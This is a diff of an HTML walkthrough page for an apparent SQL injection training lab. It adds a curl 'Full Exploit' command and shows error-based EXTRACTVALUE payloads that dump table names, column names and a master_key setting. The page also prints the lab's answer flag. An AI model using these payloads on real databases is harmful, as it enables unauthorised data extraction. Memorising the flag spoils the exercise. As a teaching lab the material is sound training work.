@@ -106,7 +106,7 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">Tables: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -<br>
-        <span class="prompt">Error: </span>XPATH syntax error: '~logs,config'<br><br>
+        <span class="prompt">Error: </span>XPATH syntax error: '~config,logs'<br><br>
         <span class="prompt">Columns: </span>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='config'))) -- -<br>
         <span class="prompt">Error: </span>XPATH syntax error: '~id,setting_name,setting_value'
     </div>
@@ -117,6 +117,18 @@
     Copy the flag from the error message and paste it into the verification form:
     <code>FLAG{3xp_b1g1nt_0v3rfl0w}</code>.
 </p>
+
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">curl. Full Exploit</span>
+    </div>
+    <div class="terminal-body">
+        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab7" \<br> --data-urlencode "ip=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT setting_value FROM config WHERE setting_name='master_key'))) -- -"
+    </div>
+</div>
 
 <div class="result-success result-box">
     <strong>Key Takeaway:</strong> The EXP() BIGINT overflow technique was a powerful
